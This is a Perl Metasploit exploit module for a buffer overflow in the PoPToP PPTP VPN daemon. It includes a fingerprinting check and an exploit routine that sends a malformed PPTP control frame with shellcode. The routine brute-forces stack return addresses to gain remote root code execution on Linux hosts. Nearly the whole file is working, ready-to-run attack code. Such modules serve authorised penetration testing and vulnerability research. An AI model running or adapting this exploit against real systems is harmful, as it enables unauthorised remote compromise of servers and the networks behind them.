package Msf::Exploit::poptop_negative_read;
use strict;
use base 'Msf::Exploit';
use Pex::Struct;

my $advanced = {
  'StackTop'     => ['0xbffffa00', 'Start address for stack ret bruteforcing.'],
  'StackBottom'  => ['0xbffff000', 'End address for stack ret bruteforcing.'],
  'StackStep'    => [0, 'Step size for ret bruteforcing, 0 for auto calculation.'],
  'BruteWait'    => [.4, 'Length in seconds to wait between brute force attempts'],
    # calculated at 228,  fudge to make more universal
  'PreRetLength' => [220, 'Space before the we start writing return address.  Note: this + ExtraSpace is how much space we have for the payload.'],
  'RetLength'    => [32, 'Length of rets after payload'],
  'ExtraSpace'   => [0, "The exploit builds two protocol frames, the header frame and the control frame. ExtraSpace allows you use this space for the payload instead of the protocol (breaking the protocol, but still triggering the bug). If this value is <= 128, it doesn't really disobey the protocol, it just uses the Vendor and Hostname fields for payload data (these should eventually be filled in to look like a real client, ie windows).  I've had successful exploitation with this set to 154, but nothing over 128 is suggested."],
  'Hostname'     => ['', 'PPTP Packet Hostname'],
  'Vendor'       => ['Microsoft Windows NT', 'PPTP Packet Hostname'],
};

my $info = {
  'Name'    => 'PoPToP Negative Read Overflow',
  'Version'  => '$Revision: 1.27 $',
  'Authors' => [ 'spoonm <ninjatools [at] hush.com>', ],
  'Arch'    => [ 'x86' ],
  'OS'      => [ 'linux' ],
  'Priv'    => 1,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The poptop port', 1723],
    },
  'Payload' =>
    {
      'Space'     => 0, # We override this to do it dynamically
      'BadChars'  => '', # Eh, we don't have any
      'PrependEncoder'   => "\x81\xC4\xC0\xFB\xFF\xFF", # add esp,0xfffffbc0 (-1088)
      'MinNops'   => 16,
    },
  'Description'  =>  
        'PoPToP Negative Read Buffer Overflow affecting '.
        'versions prior to 1.1.4-b3 and 1.1.3-20030409. '.
        'The daemon forks, so we can hit as many times as '.
        'we need to (And allowing very accurate brute forcing. '.
        'However, you can only hold 4 concurrent '.
        'processes or you won\'t hit anyore '.
        'until you free one. It does a fork() and then exec() so '.
        'so the stack should be pretty similar each attempt.'.
        'Note: Right now the vector we take does a close(sock) right before '.
        'we gain control, so you can\'t findsock.  There should be a way '.
        'to take a more complicated vector and avoid the close.',
  'Refs'  =>
    [
      'http://www.osvdb.org/3293',
      'http://securityfocus.com/archive/1/317995',
      'http://www.freewebs.com/blightninjas/',
    ],
  'DefaultTarget' => 0,
  'Targets' =>
    [
      ['Bruteforce', ''],
    ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

  return($self);
}

# Override the PayloadSpace method
sub PayloadSpace {
  my $self = shift;
  return($self->GetLocal('PreRetLength') + $self->GetLocal('ExtraSpace'));
}

my $structHeader = 
  [
    'b_u_16' => 'length',
    'b_u_16' => 'pptp_type',
    'b_u_32' => 'magic',
    'b_u_16' => 'ctrl_type',
    'b_u_16' => 'reserved0',
  ];

my $structBegin =
  [
    'struct' => 'header',
    'u_8'    => 'version_major',
    'u_8'    => 'version_minor',
  ];
my $structEnd =
  [
    'b_u_32' => 'framing_cap',
    'b_u_32' => 'bearer_cap',
    'b_u_16' => 'max_channels',
    'b_u_16' => 'firmware_rev',
    'string' => 'hostname',
    'string' => 'vendor',
  ];


sub Check {
  my $self = shift;

  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');

  my $pptpHeader = Pex::Struct->newC(
    $structHeader,
  );

  $pptpHeader->Set(
    'length'    => 156,
    'pptp_type' => 1,  # PPTP_CTRL_MESSAGE
    'magic'     => 0x1a2b3c4d,
    'ctrl_type' => 1,  # START_CTRL_CONN_RQST
    'reserved0' => 0,
  );

  my $pptpCtrl = Pex::Struct->newC(
    $self->MergeArray(
      $structBegin,
      [
        'b_u_16' => 'reserved1',
      ],
      $structEnd,
    ),
  );

  $pptpCtrl->Set(
    'header'         => $pptpHeader,
    'version_major'  => 1,
    'version_minor'  => 0,
    'reserved1'      => 0,
    'framing_cap'    => 1,
    'bearer_cap'     => 1,
    'max_channels'   => 0,
    'firmware_rev'   => 2600,
    'hostname'       => Pex::Utils::PadBuffer($self->GetLocal('Hostname'), 64),
    'vendor'         => Pex::Utils::PadBuffer($self->GetLocal('Vendor'), 64),
  );

  my $pptpPayload = $pptpCtrl->Fetch;

  my $sock = Msf::Socket->new();
  if(!$sock->Tcp($targetHost, $targetPort) || $sock->IsError) {
    $sock->PrintError;
    return(-1);
  }

  if(!$sock->Send($pptpPayload)) {
    $self->PrintLine('Error in send.');
    $sock->PrintError;
  }


  my $pptpResp = Pex::Struct->newC(
    $self->MergeArray(
      $structBegin,
      [
        'u_8'   => 'result_code',
        'u_8'   => 'error_code',
      ],
      $structEnd,
    ),
  );

  $pptpResp->Set('header', $pptpHeader);

  $pptpResp->SetSize('hostname', 64);
  $pptpResp->SetSize('vendor', 64);

  my $resp = $sock->Recv(-1);
  if(!$pptpResp->Fill($resp)) {
    $self->PrintLine('[*] Error parsing server response.');
  }

  $sock->Close;

  $self->PrintLine('[*] PPTP Response Data');

  my $data = $pptpResp->RecursiveGet;
  foreach (@{$data}) {
    $self->PrintLine($_->[0] . ': ' . $_->[1]);
  }

  if($pptpResp->Get('vendor') =~ /MoretonBay/) {
    $self->PrintLine('[*] Vendor tag matches, may be PoPToP');
    return($self->CheckCode('maybe'));
  }

  return(0);
}


sub Exploit {
  my $self = shift;

  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $encodedPayload = $self->GetVar('EncodedPayload');
  my $shellcode   = $encodedPayload->Payload;


  my $pptpHeader = Pex::Struct->newC(
    $structHeader,
  );

  $pptpHeader->Set(
    'length'    => 1,  # ;)
    'pptp_type' => 1,  # PPTP_CTRL_MESSAGE
    'magic'     => 0x1a2b3c4d,
    'ctrl_type' => 1,  # START_CTRL_CONN_RQST
    'reserved0' => 0,
  );

  my $pptpCtrl = Pex::Struct->newC(
    $self->MergeArray(
      $structBegin,
      [
        'b_u_16' => 'reserved1',
      ],
      $structEnd,
    ),
  );

  $pptpCtrl->Set(
    'header'         => $pptpHeader,
    'version_major'  => 1,
    'version_minor'  => 0,
    'reserved1'      => 0,
    'framing_cap'    => 1,
    'bearer_cap'     => 1,
    'max_channels'   => 0,
    'firmware_rev'   => 2600,
    'hostname'       => Pex::Utils::PadBuffer($self->GetLocal('Hostname'), 64),
    'vendor'         => Pex::Utils::PadBuffer($self->GetLocal('Vendor'), 64),
  );

  my $pptpPayload = $pptpCtrl->Fetch;

  $self->PrintDebugLine(1, "ExtraSpace: " . $self->GetLocal('ExtraSpace'));
  substr($pptpPayload, -1 * $self->GetLocal('ExtraSpace'), $self->GetLocal('ExtraSpace'), '');

  my $retLength   = $self->GetLocal('RetLength');
  my $bruteWait   = $self->GetLocal('BruteWait');
  my $stackTop    = hex($self->GetLocal('StackTop'));
  my $stackBottom = hex($self->GetLocal('StackBottom'));
  my $stackStep   = $self->GetLocal('StackStep');

  $stackStep = $encodedPayload->NopsLength if($stackStep == 0);
  $stackStep -= $stackStep % 4;

  for(my $ret = $stackTop; $ret >= $stackBottom; $ret -= $stackStep) {
    my $sock = Msf::Socket->new();
    if(!$sock->Tcp($targetHost, $targetPort) || $sock->IsError) {
      $sock->PrintError;
      return;
    }

    $self->PrintLine(sprintf("Trying %#08x", $ret));

    if(!$sock->Send($pptpPayload . $shellcode . (pack('V', $ret) x int($retLength / 4)))) {
      $self->PrintLine('Error in send.');
      $sock->PrintError;
    }

    $self->Handler($sock);
    $sock->Close;
    select(undef, undef, undef, $bruteWait); # ghetto sleep
  }
  return;
}
